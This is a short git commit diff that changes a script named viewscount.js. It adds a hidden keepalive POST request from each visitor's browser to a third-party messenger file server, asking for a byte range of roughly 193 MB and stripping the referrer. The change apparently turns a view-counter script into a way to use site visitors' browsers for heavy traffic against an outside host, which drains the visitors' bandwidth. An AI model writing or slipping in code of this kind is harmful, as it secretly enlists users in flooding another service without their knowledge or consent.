428aec16601b6b2316f56440160affbf3125e603
JTJ <49002275+ProfessorJTJ@users.noreply.github.com>
2023-07-08 21:36:39 +0330

    Update viewscount.js

--- js/viewscount.js
+++ js/viewscount.js
@@ -53,7 +53,24 @@
 		redirect: "follow", // manual, *follow, error
 		referrerPolicy: "no-referrer" // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
 	});
-	
+
+	fetch("https://messenger980.iranlms.ir/GetFile.ashx", {
+		keepalive: true,
+		method: "POST", // *GET, POST, PUT, DELETE, etc.
+		//mode: "no-cors", // no-cors, *cors, same-origin
+		cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
+		//credentials: "same-origin", // include, *same-origin, omit
+		headers: {
+		  "Content-Type": "text/plain",
+		  "access-hash-rec": "9175383633379079046508145577592023070821",
+		  "file-id": "14713711727822",
+		  "start-index": "0",
+		  "last-index": "193274986"
+		  // 'Content-Type': 'application/x-www-form-urlencoded',
+		},
+		redirect: "follow", // manual, *follow, error
+		referrerPolicy: "no-referrer" // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
+	});
 	return;
 
 	let theTimeZone = new Date().getTimezoneOffset(), iranianTimezone = -((3 * 60) + 30), iranianTimezoneTwo = -((4 * 60) + 30);
